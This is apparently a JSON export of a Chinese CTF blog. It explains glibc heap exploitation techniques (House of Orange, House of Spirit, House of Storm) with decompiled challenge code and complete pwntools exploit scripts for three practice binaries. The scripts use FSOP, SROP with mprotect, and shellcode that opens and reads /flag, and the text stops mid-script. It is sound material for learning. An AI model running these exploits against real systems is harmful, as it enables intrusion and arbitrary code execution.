p64(0x21) + p32(2) + p32(2) + p64(0) * 2 + p64(0xf81)edit(len(payload), payload)dbg()\n\ntop chunk大小为0x0000000000020f81修改后的top chunk 大小为0x0000000000000f81\n申请大于top chunk的chunk，进入unsortedbinadd(0x1000, 'a\\n')dbg()\n\n\n泄露libc和heap调试可得此时我们刚刚申请的0x400chunk里存放着0x00007fe0c1216188距离libc基地址0x3c5188（0x00007fe0c1216188-0x7fe0c0e51000），该chunk里还存放着heap地址，因为printf遇到’\\x00’会停止打印，所以我们将0x00007fe0c1216188改为字符串b，再将其输出\nadd(0x400, 'a' * 8)show()ru('a'*8)libc.address = u64(ru('\\x7f').ljust(8, '\\x00')) - 0x3c5188lg('libc.address',libc.address)io_list_all = libc.symbols['_IO_list_all']system = libc.symbols['system']dbg()\n\n\n我们泄露出的heap为0x5617117b30e0，距离heap基地址0x5617117b30e0-0x5617117b3000=0xe0，由此可获得heap_base地址\npayload = 'b' * 0x10edit(0x10, payload)show()ru('b'*0x10)heap = u64(sh.recvuntil('\\n').strip().ljust(8, '\\x00'))heap_base = heap - 0xE0lg('heap_base',heap_base)dbg()\n\n\n构造fake_file接下来我们修改当前unsortedbin中chunk的大小和内容,这里FSOP还不太明白，先借用一下大佬写的解释\nmalloc时，对unsorted bin进行判断，此时该chunk的size为0x60，不满足要求，就把该chunk放入small bin，并且向bk-&gt;fd写入main_arena+0x58，即向_IO_list_all写入main_arena+0x58，此时判断下一个unsorted bin（_IO_list_all），而这里实际上没有chunk，此时会触发错误，此时第一个_IO_FILE_plus结构体为main_arena+0x58，而它不满足条件，就通过_chain调到下一个_IO_FILE_plus结构体，_chain位于0x68偏移的地方，main_arena+0x58+0x68=main_arena+0xc0，就是small bin中0x60大小的地方，这就回到了我们伪造的_IO_FILE_plus结构体\ndbg()payload = 'a' * 0x400 + p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0)fake_file = '/bin/sh\\x00'+p64(0x61)#to small binfake_file += p64(0)+p64(io_list_all-0x10)fake_file += p64(0) + p64(1)#_IO_write_base &lt; _IO_write_ptrfake_file = fake_file.ljust(0xc0,'\\x00')fake_file += p64(0) * 3fake_file += p64(heap_base+0x5E8) #vtable ptrfake_file += p64(0) * 2fake_file += p64(system)payload += fake_fileedit(len(payload), payload)dbg()\n\n修改前修改后\n之后我们再调用add函数，调用malloc函数，就可以产生错误信息，改变程序执行流程，获得shell\nru(\"Your choice : \")sl('1')itr()\n\nexp# coding=utf-8from pwn import  * context(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debug binary = './houseoforange_hitcon_2016'  #sh = process(binary) #连接本地程序sh = remote('node4.buuoj.cn',26188) #连接远程程序elf = ELF(binary)     libc = ELF('../../libc-2.23.so--64')  #libc-2.23.so--64one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]one_gadget[0] = 0x45216s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims  :sh.recvuntil(delims )itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\\0'))uu64    = lambda data               :u64(data.ljust(8,'\\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg=lambda address,data:log.success('%s: '%(address)+hex(data))#定义gdb调试函数def dbg():        gdb.attach(sh)        pause()def add(size, content, price='2', color='1'):    ru(\"Your choice : \")    sl('1')    ru(\"Length of name :\")    sl(str(size))    ru(\"Name :\")    sh.send(content)    ru(\"Price of Orange:\")    sl(str(price))    ru(\"Color of Orange:\")    #1-7    sl(str(color))def show():    ru(\"Your choice : \")    sl('2')def edit(size, content, price='2', color='1'):    ru(\"Your choice : \")    sl('3')    ru(\"Length of name :\")    sl(str(size))    ru(\"Name:\")    sh.send(content)    ru(\"Price of Orange:\")    sl(str(price))    ru(\"Color of Orange:\")    #1-7    sl(str(color))add(0x30,'aaaa\\n')#dbg()payload = 'a' * 0x30 +p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0) * 2 + p64(0xf81) edit(len(payload), payload)#dbg()add(0x1000, 'a\\n')#dbg()add(0x400, 'a' * 8)#dbg()show()ru('a'*8)libc.address = u64(ru('\\x7f').ljust(8, '\\x00')) - 0x3c5188lg('libc.address',libc.address)  io_list_all = libc.symbols['_IO_list_all']system = libc.symbols['system']payload = 'b' * 0x10 edit(0x10, payload)show()ru('b'*0x10)heap = u64(sh.recvuntil('\\n').strip().ljust(8, '\\x00'))heap_base = heap - 0xE0lg('heap_base',heap_base)#dbg() payload = 'a' * 0x400 + p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0)fake_file = '/bin/sh\\x00'+p64(0x61)#to small binfake_file += p64(0)+p64(io_list_all-0x10)fake_file += p64(0) + p64(1)#_IO_write_base &lt; _IO_write_ptrfake_file = fake_file.ljust(0xc0,'\\x00')fake_file += p64(0) * 3fake_file += p64(heap_base+0x5E8) #vtable ptrfake_file += p64(0) * 2fake_file += p64(system)payload += fake_fileedit(len(payload), payload)#dbg() ru(\"Your choice : \")sl('1')itr()\n\n可能因为本地环境没配好，打不通，在buu上远程可以打通\n\n参考文章houseoforange_hitcon_2016houseoforange_hitcon_2016\n\n","categories":["heap"],"tags":["House of 系列"]},{"title":"House of Spirit","url":"/2023/04/10/House%20of%20Spirit/","content":"该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。\n要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即\nfake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。fake chunk 地址需要对齐， MALLOC_ALIGN_MASKfake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem 。fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。\n\n想要使用该技术分配 chunk 到指定地址，其实并不需要修改指定地址的任何内容，关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测。\n","categories":["heap"],"tags":["House of 系列"]},{"title":"House of Storm + 堆SROP + orw","url":"/2023/04/10/House%20of%20Storm+%E5%A0%86SROP+orw/","content":"同样是house of storm，但是如果程序开启了沙箱，禁用了system函数，那我们常规把hook函数改为system函数的方法就失效了，若是沙箱没有禁用open，read，write函数，这里我们可以考虑用orw。\n例题rctf_2019_babyheap\n保护全开，禁用了execve就是禁用了system，因为system函数通过调用execve函数才能执行。看一下ida\nmain函数可以看到是实现了四个功能，增改删查\nint __cdecl main(int argc, const char **argv, const char **envp){  init(argc, argv, envp);  while ( 1 )  {    menu();    switch ( get_int() )    {      case 1:        add();        break;      case 2:        edit();        break;      case 3:        delete();        break;      case 4:        show();        break;      case 5:        puts(\"See you next time!\");        exit(0);      default:        puts(\"Invalid choice!\");        break;    }  }}\n\nadd函数可以申请最大0x1000大小的chunk，最多申请16个chunk\nunsigned __int64 add(){  void **v0; // rbx  int i; // [rsp+0h] [rbp-20h]  int size; // [rsp+4h] [rbp-1Ch]  unsigned __int64 v4; // [rsp+8h] [rbp-18h]  v4 = __readfsqword(0x28u);  for ( i = 0; *(ptrs + 2 * i) &amp;&amp; i &lt;= 15; ++i )    ;  if ( i == 16 )  {    puts(\"You can't\");    exit(-1);  }  printf(\"Size: \");  size = get_int();  if ( size &lt;= 0 || size &gt; 0x1000 )  {    puts(\"Invalid size :(\");  }  else  {    *(ptrs + 4 * i + 2) = size;    v0 = (ptrs + 16 * i);    *v0 = calloc(size, 1uLL);    puts(\"Add success :)\");  }  return __readfsqword(0x28u) ^ v4;}\n\nedit函数存在off-by-null漏洞\nunsigned __int64 edit(){  unsigned int v1; // [rsp+0h] [rbp-10h]  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  printf(\"Index: \");  v1 = get_int();  if ( v1 &lt;= 0xF &amp;&amp; *(ptrs + 2 * v1) )  {    printf(\"Content: \");    *(*(ptrs + 2 * v1) + read_n(*(ptrs + 2 * v1), *(ptrs + 4 * v1 + 2))) = 0; //off-by-one    puts(\"Edit success :)\");  }  else  {    puts(\"Invalid index :(\");  }  return __readfsqword(0x28u) ^ v2;}\n\ndelete函数unsigned __int64 delete(){  unsigned int v1; // [rsp+4h] [rbp-Ch]  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  printf(\"Index: \");  v1 = get_int();  if ( v1 &lt;= 0xF &amp;&amp; *(ptrs + 2 * v1) )  {    free(*(ptrs + 2 * v1));    *(ptrs + 2 * v1) = 0LL;    *(ptrs + 4 * v1 + 2) = 0;    puts(\"Delete success :)\");  }  else  {    puts(\"Invalid index :(\");  }  return __readfsqword(0x28u) ^ v2;}\n\nshow函数unsigned __int64 show(){  unsigned int v1; // [rsp+4h] [rbp-Ch]  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  printf(\"Index: \");  v1 = get_int();  if ( v1 &lt;= 0xF &amp;&amp; *(ptrs + 2 * v1) )    puts(*(ptrs + 2 * v1));  else    puts(\"Invalid index :(\");  return __readfsqword(0x28u) ^ v2;}\n\n思路看了大佬的博客rctf_2019_babyheap，这里对其进行详细的解析。程序禁用了fastbin，且能申请最大为0x1000大小的chuck，可以使用house of storm，修改free_hook的地址为shellcode，执行shellcode，这里我们需要用orw来写shellcode，并且在这之前需要用mprotect函数修改free_hook段为可读可写可执行权限。\n调试过程先把前面的写好\n# coding=utf-8from pwn import *#sh = remote(\"node4.buuoj.cn\", 29278)sh = process('./rctf_2019_babyheap')context(log_level = 'debug', arch = 'amd64', os = 'linux')elf = ELF(\"./rctf_2019_babyheap\")libc = ELF('../../libc-2.23.so--64')def dbg():        gdb.attach(sh)        pause()#命令简写化s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims   :sh.recvuntil(delims)itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\\0'))uu64    = lambda data               :u64(data.ljust(8,'\\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg=lambda address,data:log.success('%s: '%(address)+hex(data)) def add(size):\tru(\"Choice: \\n\")\tsl('1')\tru(\"Size: \")\tsl(str(size))def free(index):\tru(\"Choice: \\n\")\tsl('3')\tru(\"Index: \")\tsl(str(index))def show(index):\tru(\"Choice: \\n\")\tsl('4')\tru(\"Index: \")\tsl(str(index))def edit(index, content):\tru(\"Choice: \\n\")\tsl('2')\tru(\"Index: \")\tsl(str(index))\tru(\"Content: \")\ts(content)\n\n首先构造堆块重叠，泄露libc基地址先申请四个chunk，申请的chunk真正大小分别为0x90,0x70,0x100,0x20,chunk_3是为了free前三个chunk后防止堆块合并\nadd(0x80)#0add(0x68)#1add(0xf0)#2add(0x18)#3dbg()\n\n之后free chunk_0，此时因为禁用了fastbin，所以chunk_0直接进入了unsortedbin里，再利用off-by-null漏洞修改chunk_2的pre_size为0x100（chunk_0+chunk_1正好就是0x100），修改chunk_2的size为0x100，使他处于free状态。\nfree(0)payload = 'a'*0x60 + p64(0x100)edit(1, payload)dbg()\n\nfree chunk_2后，触发堆块前向合并，chunk_2的pre_size为是0x100,chunk_0和chunk_1加起来是0x100，就是前三个chunk合并。unsortedbin里存放着原chunk_0的起始地址。\nfree(2)dbg()\n\n\n此时chunk_1是没有被free的，然后我们再次申请0x80（原chunk_0大小）大小的chunk，此时原chunk_1的mem区域存放着main_arena+88，因为chunk_1并没有被free，所以我们直接调用show函数即可泄露libc基地址。\nadd(0x80)#0show(1)malloc_hook = u64(ru('\\x7f').ljust(8, '\\x00')) - 0x58 - 0x10libc.address = malloc_hook - libc.sym['__malloc_hook']system = libc.sym['system']free_hook = libc.sym['__free_hook']set_context = libc.symbols['setcontext']lg('libc_base',libc.address)dbg()\n\n\n构造unsortbin chunk 和largebin chunk，进行 house of strom先申请0x160大小的chunk，将unsortbin中残余chunk清空，之后构造unsortbin chunk 和largebin chunk的调试过程请参考我另一篇文章House of storm此时我们已以可以修改free_hook处的值了\n#---------------布置chunk-------------------------#add(0x18)#4add(0x508)#5add(0x18)#6add(0x18)#7add(0x508)#8add(0x18)#9add(0x18)#10#dbg()#----------------准备 unsorted chunk-----------------------#\tedit(5, 'a'*0x4f0+p64(0x500))#dbg()free(5)edit(4, 'a'*0x18)#dbg()add(0x18)#5add(0x4d8)#11free(5)free(6)#dbg()add(0x30)#5add(0x4e8)#6#dbg()#-------------------准备 large chunk-----------------------------------#edit(8, 'a'*0x4f0+p64(0x500))free(8)edit(7, 'a'*0x18)add(0x18)#8add(0x4d8)#12free(8)free(9)add(0x40)#8#---------------unsorted chunk 和 large chunk 放到对应位置----------------------##dbg()free(6)#dbg()add(0x4e8)#6#dbg()free(6)#dbg()#pause()#--------------修改他们的满足条件进行 house of strom------------------------------#storage = free_hookfake_chunk = storage - 0x20payload = '\\x00'*0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)edit(11, payload)#dbg()payload = '\\x00'*0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) +p64(0) + p64(fake_chunk-0x18-5)edit(12, payload)#dbg()add(0x48)#6\n\nmprotect+shellcode修改free_hook为set_context+53，free_hook+0x18，free_hook+0x18，shellcode1,setcontext函数负责对各个寄存器进行赋值，甚至可以控制rip，对寄存器进行赋值主要从+53开始，shellcode1即为read(0, new_addr,0x1000)，new_addr即为（free_hook &amp;0xFFFFFFFFFFFFF000）free_hook所在内存页的起始位置。我们将对这里赋予可读可写可执行权限。\nnew_addr =  free_hook &amp;0xFFFFFFFFFFFFF000shellcode1 = '''xor rdi,rdimov rsi,%dmov edx,0x1000mov eax,0syscalljmp rsi''' % new_addredit(6, 'a'*0x10+p64(set_context+53)+p64(free_hook+0x18)*2+asm(shellcode1))\n\n\n修改前修改后\nSROP我们利用pwntools里的SigreturnFrame()执行mprotect(new_addr,0x1000,7)，并将rsp跳转到free_hook+0x10处，即0x00007f05935487c0，之后执行0x00007f05935487c0地址处的代码，即我们刚才写入的shellcode1，执行read(0, new_addr,0x1000)，将我们构造的第二个shellcode写入0x00007f0593548000处 ，并将rip跳转到我们写的第二个shellcode处执行。\nframe = SigreturnFrame()frame.rsp = free_hook+0x10frame.rdi = new_addrframe.rsi = 0x1000frame.rdx = 7frame.rip = libc.sym['mprotect']edit(12, str(frame))free(12)\n\n\nORW利用orw构造shellcode，发送过去并执行，获得shell\nshellcode2 = '''mov rax, 0x67616c662f ;// /flagpush raxmov rdi, rsp ;// /flagmov rsi, 0 ;// O_RDONLYxor rdx, rdx ;mov rax, 2 ;// SYS_opensyscallmov rdi, rax ;// fd mov rsi,rsp  ;mov rdx, 1024 ;// nbytesmov rax,0 ;// SYS_readsyscallmov rdi, 1 ;// fd mov rsi, rsp ;// bufmov rdx, rax ;// count mov rax, 1 ;// SYS_writesyscallmov rdi, 0 ;// error_codemov rax, 60syscall'''sl(asm(shellcode2))itr()\n\n\nexp# coding=utf-8from pwn import *#sh = remote(\"node4.buuoj.cn\", 29278)sh = process('./rctf_2019_babyheap')context(log_level = 'debug', arch = 'amd64', os = 'linux')elf = ELF(\"./rctf_2019_babyheap\")libc = ELF('../../libc-2.23.so--64')def dbg():        gdb.attach(sh)        pause()#命令简写化s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims   :sh.recvuntil(delims)itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\\0'))uu64    = lambda data               :u64(data.ljust(8,'\\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg=lambda address,data:log.success('%s: '%(address)+hex(data)) def add(size):\tru(\"Choice: \\n\")\tsl('1')\tru(\"Size: \")\tsl(str(size))def free(index):\tru(\"Choice: \\n\")\tsl('3')\tru(\"Index: \")\tsl(str(index))def show(index):\tru(\"Choice: \\n\")\tsl('4')\tru(\"Index: \")\tsl(str(index))def edit(index, content):\tru(\"Choice: \\n\")\tsl('2')\tru(\"Index: \")\tsl(str(index))\tru(\"Content: \")\ts(content)def pwn(): \tadd(0x80)#0\tadd(0x68)#1\tadd(0xf0)#2\tadd(0x18)#3\t\t#dbg()\tfree(0)\tpayload = 'a'*0x60 + p64(0x100)\tedit(1, payload)\t\t#dbg()\t\tfree(2)\t#dbg()\tadd(0x80)#0\tshow(1)\tmalloc_hook = u64(ru('\\x7f').ljust(8, '\\x00')) - 0x58 - 0x10\tlibc.address = malloc_hook - libc.sym['__malloc_hook']\tsystem = libc.sym['system']\tfree_hook = libc.sym['__free_hook']\tset_context = libc.symbols['setcontext']\tlg('libc_base',libc.address)\t\t#dbg()\t\tadd(0x160)#2\t#dbg()\t#---------------布置chunk-------------------------#\tadd(0x18)#4\tadd(0x508)#5\tadd(0x18)#6\tadd(0x18)#7\tadd(0x508)#8\tadd(0x18)#9\tadd(0x18)#10\t#dbg()\t#----------------准备 unsorted chunk-----------------------#\t\tedit(5, 'a'*0x4f0+p64(0x500))\t#dbg()\tfree(5)\tedit(4, 'a'*0x18)\t\t#dbg()\tadd(0x18)#5\tadd(0x4d8)#11\tfree(5)\tfree(6)\t\t#dbg()\t\tadd(0x30)#5\tadd(0x4e8)#6\t\t#dbg()\t\t#-------------------准备 large chunk-----------------------------------#\tedit(8, 'a'*0x4f0+p64(0x500))\tfree(8)\tedit(7, 'a'*0x18)\tadd(0x18)#8\tadd(0x4d8)#12\tfree(8)\tfree(9)\tadd(0x40)#8\t#---------------unsorted chunk 和 large chunk 放到对应位置----------------------#\t\t#dbg()\t\tfree(6)\t\t#dbg()\t\tadd(0x4e8)#6\t\t#dbg()\t\tfree(6)\t#dbg()\t#pause()\t#--------------修改他们的满足条件进行 house of strom------------------------------#\tstorage = free_hook\tfake_chunk = storage - 0x20\tpayload = '\\x00'*0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)\tedit(11, payload)\t#dbg()\tpayload = '\\x00'*0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) +p64(0) + p64(fake_chunk-0x18-5)\tedit(12, payload)\t#dbg()\tadd(0x48)#6\t\t#dbg()\tnew_addr =  free_hook &amp;0xFFFFFFFFFFFFF000\tshellcode1 = '''\txor rdi,rdi\tmov rsi,%d\tmov edx,0x1000\tmov eax,0\tsyscall\tjmp rsi\t''' % new_addr\tedit(6, 'a'*0x10+p64(set_context+53)+p64(free_hook+0x18)*2+asm(shellcode1))\t#dbg()\tframe = SigreturnFrame()\tframe.rsp = free_hook+0x10\tframe.rdi = new_addr\tframe.rsi = 0x1000\tframe.rdx = 7\tframe.rip = libc.sym['mprotect']\tedit(12, str(frame))\tfree(12)\t#dbg() \tshellcode2 = '''\tmov rax, 0x67616c662f ;// /flag\tpush rax\tmov rdi, rsp ;// /flag\tmov rsi, 0 ;// O_RDONLY\txor rdx, rdx ;\tmov rax, 2 ;// SYS_open\tsyscall\tmov rdi, rax ;// fd \tmov rsi,rsp  ;\tmov rdx, 1024 ;// nbytes\tmov rax,0 ;// SYS_read\tsyscall\tmov rdi, 1 ;// fd \tmov rsi, rsp ;// buf\tmov rdx, rax ;// count \tmov rax, 1 ;// SYS_write\tsyscall\tmov rdi, 0 ;// error_code\tmov rax, 60\tsyscall\t'''\tsl(asm(shellcode2))\t\tdbg()\titr()  pwn()","categories":["heap"],"tags":["House of 系列"]},{"title":"House of Storm","url":"/2023/04/10/House%20of%20Storm/","content":"House of storm结合了unsorted_bin_attack和Largebin_attack的攻击技术,实现任意地址分配chunk，任意地址写。\n利用条件:1.需要攻击者在largebin和unsorted_bin中分别布置一个chunk ，  这两个chunk需要在归位之后处于同一个largebin的index中，  且unsortedbin中的chunk要比largebin中的大2.需要unsorted_bin中的bk指针可控3.需要largebin中的bk指针和bk_nextsize指针可控4.glibc版本小于2.30,因为2.30之后加入了检查\n\nlargebin中size与index的对应关系size    index[0x400 , 0x440)   \t 64[0x440 , 0x480)    \t 65[0x480 , 0x4C0)   \t 66[0x4C0 , 0x500)   \t 67[0x500 , 0x540)   \t 68等差 0x40    …[0xC00 , 0xC40)    \t 96[0xC40 , 0xE00)      97[0xE00 , 0x1000)     98[0x1000 , 0x1200)    99[0x1200 , 0x1400)    100[0x1400 , 0x1600)    101等差 0x200    …[0x2800 , 0x2A00)    111[0x2A00 , 0x3000)    112[0x3000 , 0x4000)    113[0x4000 , 0x5000)    114等差 0x1000    …[0x9000 , 0xA000)      119[0xA000 , 0x10000)     120[0x10000 , 0x18000)    121[0x18000 , 0x20000)    122[0x20000 , 0x28000)    123[0x28000 , 0x40000)    124[0x40000 , 0x80000)    125[0x80000 , …. )        126\n\n利用方法1.将unsorted_bin中的bk指针改为fake_chunk2.largebin中的bk指针改为fake_chunk+8，bk_nextsize指针改为fake_chunk-0x18-5\t,（target为要修改的目标地址，fake_chunk为target-0x20） 来满足victim-&gt;bk_nextsize-&gt;fd_nextsize = victim（即fake_chunk-0x18-5=victim）3.再次malloc获得target地址处的chunk，可修改target地址处的值\n\nHouse_of_storm的精髓所在——伪造size，如果在程序开启PIE的情况下，堆地址的开头通常是0x55或者0x56开头，且我们的堆地址永远都是6个字节，且如果是小端存储的话，减去五个字节，剩下的就是0x55了。如果提前5个字节开始写堆地址，那么伪造在size字段上面的就正好是0x55。如果后续再申请堆块时，通过对齐使0x55对齐之后和攻击者申请的size正好相同的话，就可以在任意地址上申请出来一个chunk，也就可以达成后续的任意地址写操作。之所以是0x56是因为__int_malloc在拿到chunk后返回到__libc_malloc，__libc_malloc会对chunk的进行检查，这里如果有错的话会直接crash，必须满足以下条件之一即可：\n1. victim 为 02. IS_MMAPPED 为 13. NON_MAIN_ARENA 为 0\n\n0x56（二进制数为0101 0110）满足条件0x55（二进制数为0101 0101）不满足条件但是由于程序有随机化，多运行几次总能有一次成功的。\nunsorted_bin-&gt;fd = 0unsorted_bin-&gt;bk = fake_chunklarge_bin-&gt;fd = 0large_bin-&gt;bk = fake_chunk+8large_bin-&gt;fd_nextsize = 0large_bin-&gt;bk_nextsize = fake_chunk - 0x18 -5\n\n例题2019 西湖论剑 Storm_note保护全开，实现四个功能，增改删退，ida查看伪代码init_proc()函数，mallopt()函数，设置fastbin 范围最大为0，禁用了fastbin，之后用mmap在 0xABCD0100处分配0x30大小的空间，填充上了随机数\ninit_proc()函数 ssize_t init_proc(){  ssize_t result; // rax  int fd; // [rsp+Ch] [rbp-4h]  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  setbuf(stderr, 0LL);  if ( !mallopt(1, 0) )                         // mallopt(M_MXFAST,0)将global_max_fast设置为0,                                                // 这个值的意思是最大为多大的chunk归fastbin管理,                                                // 设置为0表示这个程序中不再存在fastbin。                                                // 即本程序禁用了fastbin。    exit(-1);  if ( mmap(0xABCD0000LL, 0x1000uLL, 3, 34, -1, 0LL) != 0xABCD0000LL )    exit(-1);  fd = open(\"/dev/urandom\", 0);  if ( fd &lt; 0 )    exit(-1);  result = read(fd, 0xABCD0100LL, 0x30uLL);  if ( result != 48 )    exit(-1);  return result;}\n\nadd函数calloc函数来分配堆空间，因此返回前会对分配的堆的内容进行清零。\nunsigned __int64 alloc_note(){  int size; // [rsp+0h] [rbp-10h] BYREF  int i; // [rsp+4h] [rbp-Ch]  unsigned __int64 v3; // [rsp+8h] [rbp-8h]  v3 = __readfsqword(0x28u);  for ( i = 0; i &lt;= 15 &amp;&amp; note[i]; ++i )    ;  if ( i == 16 )  {    puts(\"full!\");  }  else  {    puts(\"size ?\");    _isoc99_scanf(\"%d\", &amp;size);    if ( size &gt; 0 &amp;&amp; size &lt;= 0xFFFFF )    {      note[i] = calloc(size, 1uLL);             // calloc函数来分配堆空间，因此返回前会对分配的堆的内容进行清零。                                                //       note_size[i] = size;      puts(\"Done\");    }    else    {      puts(\"Invalid size\");    }  }  return __readfsqword(0x28u) ^ v3;}\n\nedit函数存在off-by-null\nunsigned __int64 edit_note(){  unsigned int size; // [rsp+0h] [rbp-10h] BYREF  int v2; // [rsp+4h] [rbp-Ch]  unsigned __int64 v3; // [rsp+8h] [rbp-8h]  v3 = __readfsqword(0x28u);  puts(\"Index ?\");  _isoc99_scanf(\"%d\", &amp;size);  if ( size &lt;= 0xF &amp;&amp; note[size] )  {    puts(\"Content: \");    v2 = read(0, note[size], note_size[size]);    *(note[size] + v2) = 0;                     // off-by-null                                                //     puts(\"Done\");  }  else  {    puts(\"Invalid index\");  }  return __readfsqword(0x28u) ^ v3;}\n\nfree函数无uaf\nunsigned __int64 delete_note(){  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  puts(\"Index ?\");  _isoc99_scanf(\"%d\", &amp;v1);  if ( v1 &lt;= 0xF &amp;&amp; note[v1] )  {    free(note[v1]);    note[v1] = 0LL;    note_size[v1] = 0;  }  else  {    puts(\"Invalid index\");  }  return __readfsqword(0x28u) ^ v2;}\n\n一个后门函数要想执行system(“/bin/sh”);，需要输入与程序一开始分配的随机数相同的数\nvoid __noreturn backdoor(){  char buf[56]; // [rsp+0h] [rbp-40h] BYREF  unsigned __int64 v1; // [rsp+38h] [rbp-8h]  v1 = __readfsqword(0x28u);  puts(\"If you can open the lock, I will let you in\");  read(0, buf, 0x30uLL);  if ( !memcmp(buf, 0xABCD0100LL, 0x30uLL) )    system(\"/bin/sh\");  exit(0);}\n\n思路1、利用off-by-null 漏洞构造堆风水，实现堆块重叠，从而控制堆块内容。2、House of storm，将处于unsortedbin的可控制的chunk放入largebin中，以便触发largebin attack3、控制largebin的bk和bk_nextsize指针，通过malloc触发漏洞，分配到目标地址，实现任意地址写，将0xABCD0100处的0x30字节改为已知值，获得shell\n过程先把前面的东西写好\n# coding=utf-8from pwn import *#context(endian='little',os='linux',arch='amd64',log_level='debug')sh = process('./Storm_note')s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims\t\t    :sh.recvuntil(delims)itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\\0'))uu64    = lambda data               :u64(data.ljust(8,'\\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))def dbg():        gdb.attach(sh)        pause()def add(size):  sla('Choice','1')  sla('?',str(size))def edit(index,text):  sla('Choice','2')  sla('?',str(index))  sa('Content',text)def free(index):  sla('Choice','3')  sla('?',str(index))\n\n首先申请两组chunk，用来构造堆块重叠，并进入unsortedbin和largebin\nadd(0x18)#0add(0x508)#1add(0x18)#2add(0x18)#3add(0x508)#4add(0x18)#5add(0x18)#6dbg()\n\n\n然后构造两个伪造的prev_size，用于绕过malloc检查，保护下一个chunk的prev_size不被修改。\nedit(1,'a'*0x4f0+p64(0x500)) edit(4,'a'*0x4f0+p64(0x500)) dbg()\n\n然后再free(1)，利用off-by-null编辑chunk_0，将chunk_1的size从0x510改为0x500，由于刚才构造的两个fake chunk，此时堆块已合并\nfree(1)edit(0,'a'*0x18)#off-by-null改写chunk1的size为0x500dbg()\n\n再申请两个chunk，使之恢复正常，之后free掉chunk_1和chunk_2，使之合并\nadd(0x18)#1add(0x4d8)#7  free(1)free(2)    dbg()\n\n再次申请两个特定大小的chunk即可实现chunk7可以控制原unsortedbin chunk 0x4f1的bk指针，即我们可以用chunk_7来控制chunk_2(unsortedbin chunk),为便于理解我们可查看一下note这个存放全局chunk mem指针的数组\nadd(0x30)#1 此时chunk1可以控制原unsortedbin chunk  0x4f1(chunk_2)的bk指针add(0x4e0)#2dbg()\n\n下面同理获得chunk8可以控制原 （largebin chunk 0x4e1 ）的bk指针和bk_nextsize指针\nfree(4)edit(3,'a'*0x18)#off by nulladd(0x18)#4add(0x4d8)#8 0x5a0free(4)free(5)add(0x40)#4 0x580\n\n之后free(2)，放入unsortedbin\nfree(2)    dbg()\n\n再申请回来0x4e8（0x4f0）大小的chunk，使0x4e0大小的chunk进入largebin\nadd(0x4e8)      # put chunk8(0x5c0) to largebindbg()\n\n再次free(2)，构造一个unsortedbin chunk和一个largebin chunk\nfree(2) #put chunk2 to unsortedbindbg()\n\n之后利用刚才构造的堆块重叠，修改unsortedbin chunk的bk指针为目标地址（target-0x20）\ntarget = 0xabcd0100fake_chunk = target - 0x20payload = p64(0)*2 + p64(0) + p64(0x4f1) # sizepayload += p64(0) + p64(fake_chunk)      # bkedit(7,payload)dbg()\n\n之后利用刚才构造的堆块重叠，修改largebin chunk的bk指针和bk_nextsize指针分别为fake_chunk+8，和fake_chunk-0x18-5\npayload2 = p64(0)*4 + p64(0) + p64(0x4e1) #sizepayload2 += p64(0) + p64(fake_chunk+8)   payload2 += p64(0) + p64(fake_chunk-0x18-5)#mmapedit(8,payload2)dbg()\n\n然后申请0x40（0x50）大小的chunk，可以看到在目标地址处0xabcd00e0成功伪造fake chunk，size为0x56，巧妙的实现victim-&gt;bk_nextsize-&gt;fd_nextsize = victim\nadd(0x40)dbg()\n\n之后就是把0xABCD0100处的0x30个字节改为已知数，然后获得shell\npayload = 